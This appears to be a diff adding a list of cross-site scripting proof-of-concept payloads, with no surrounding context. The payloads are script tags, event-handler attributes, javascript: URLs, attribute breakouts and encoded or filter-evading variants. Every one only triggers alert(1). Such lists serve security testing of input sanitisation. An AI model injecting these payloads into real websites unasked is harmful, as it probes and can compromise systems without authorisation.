@@ -1,0 +1,28 @@
+<script>alert(1)</script>
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<video><source onerror="alert(1)">
+<body onload=alert(1)>
+<a href="javascript:alert(1)">Click me</a>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;
+\u003Cscript\u003Ealert(1)\u003C/script\u003E
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<input type="text" onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<scr<script>ipt>alert(1)</scr<script>ipt>
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<a href="javascript:alert(1)">Click me</a>
+<iframe src="javascript:alert(1)"></iframe>
+<object data="javascript:alert(1)"></object>
+<details open ontoggle=alert(1)>
+<isindex onfocus=alert(1) autofocus>
+<x onclick=alert(1)>
+<math><mtext onmouseover=alert(1)>Hover</mtext></math>
